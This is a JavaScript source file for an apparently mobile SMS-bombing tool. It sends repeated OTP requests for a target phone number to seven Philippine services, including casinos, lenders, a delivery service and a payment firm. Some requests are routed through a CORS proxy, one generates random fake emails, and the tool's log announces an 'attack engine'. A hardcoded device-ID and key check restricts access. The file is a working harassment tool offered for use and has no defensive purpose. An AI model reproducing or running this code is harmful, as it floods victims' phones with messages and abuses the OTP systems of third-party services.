const proxy = "https://api.allorigins.win/get?url=";

const apiList = [
    {
        name: "LAKIWIN",
        fire: (t) => {
            const data = JSON.stringify({"phoneNumber": "0" + t, "otpType": "LOGIN_OTP"});
            return axios.get(proxy + encodeURIComponent("https://www.lakiwin.com/service/mobile/check?data=" + data));
        }
    },
    {
        name: "S5_CASINO",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://api.s5.com/player/api/v1/otp/request?phone_number=%2B63" + t))
    },
    {
        name: "FINBRO",
        fire: (t) => {
            const data = JSON.stringify({"mobilePhone": {"number": "0" + t}});
            return axios.get(proxy + encodeURIComponent("https://api.finbro.ph/web/public/client/phone/sms-code?data=" + data));
        }
    },
    {
        name: "BISTRO",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://bistrodelivers.com.ph/p/api/s/v2/brand_venues/bvhvXayDs85SAFAZo6g6qctA/customers/otp?phone_number=" + t + "&dial_code=+63&phone_country=PH&channel=sms"))
    },
    {
        name: "BAYAD",
        fire: (t) => axios.post("https://api.online.bayad.com/api/sign-up/otp", {"mobileNumber": "+63" + t, "emailAddress": "u" + Math.floor(Math.random() * 99) + "@gmail.com"})
    },
    {
        name: "FASTCASH",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://api.fastcash.ph/v1/auth/otp?phone_number=63" + t))
    },
    {
        name: "CARMUDI",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://ucrf.carbay.com/sms/send-otp?countryCode=ph&mobile=" + t))
    }
];

async function checkAccess() {
    const { identifier } = await Capacitor.Plugins.Device.getId();
    if (identifier === "a6604ff06fa2e862" || localStorage.getItem("user_access_token") === (identifier + "JARED")) {
        document.getElementById('main-app-interface').style.display = 'block';
        return;
    }
    const userKey = prompt("DEVICE ID: " + identifier + "\n\nRESTRICTED: Enter Key:");
    if (userKey === identifier + "JARED") {
        localStorage.setItem("user_access_token", userKey);
        document.getElementById('main-app-interface').style.display = 'block';
    } else {
        window.location.href = "https://www.facebook.com/jaredvxx";
    }
}
window.onload = checkAccess;

async function start() {
    const num = document.getElementById('num').value;
    const amount = document.getElementById('otpAmount').value;
    const log = document.getElementById('log');

    if(!num || num.length < 10) { alert("ERROR: Enter 10-digit number."); return; }

    log.innerHTML = "[+] ATTACK ENGINE ENGAGED...<br>";

    for(let i=1; i<=amount; i++) {
        log.innerHTML += "[CYCLE #" + i + "] Launching All APIs...<br>";
        
        const promises = apiList.map(api => 
            api.fire(num).then(() => {
                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] " + api.name + " Delivered.</span><br>";
            }).catch(() => {
                log.innerHTML += "<span style='color: #f00;'>[FAILED] " + api.name + " Blocked.</span><br>";
            })
        );

        await Promise.all(promises);
        log.scrollTop = log.scrollHeight;
        await new Promise(r => setTimeout(r, 2000));
    }
    log.innerHTML += "[!] OPERATION COMPLETE.<br>";
}
